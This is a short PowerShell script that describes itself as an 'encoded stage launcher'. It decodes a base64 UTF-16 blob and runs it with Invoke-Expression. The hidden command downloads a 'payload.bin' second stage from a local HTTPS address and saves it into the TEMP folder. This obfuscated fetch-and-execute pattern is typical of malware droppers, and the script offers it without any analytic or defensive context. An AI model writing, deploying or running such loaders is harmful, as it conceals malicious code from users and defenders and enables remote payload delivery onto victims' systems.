<#
.SYNOPSIS
    Encoded stage launcher.

.DESCRIPTION
    Reassembles a base64 stage, decodes it as UTF-16 and
    invokes the resulting text in the current session.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [int]$TimeoutSec = 35
)
$EncodedStage = (
    "JABTAHQAYQBnAGUAMgBVAHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwAxADIANwAuADAALgAw" +
    'AC4AMQA6ADgANAA0ADMALwBkAG8AdwBuAGwAbwBhAGQAcwAvAHAAYQB5AGwAbwBhAGQALgBiAGkA' +
    'bgAiADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABT' +
    'AHQAYQBnAGUAMgBVAHIAbAAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAA' +
    'XABzAHQAYQBnAGUAMgAuAGIAaQBuACIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBn' +
    'AA=='
)
$StageText = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedStage))
try {
    Write-Verbose ("Decoded stage length: " + $StageText.Length)
    if ([string]::IsNullOrWhiteSpace($StageText)) {
        throw "Decoded stage was empty"
    }
    Invoke-Expression $StageText
}
catch {
    Write-Warning "Encoded stage failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
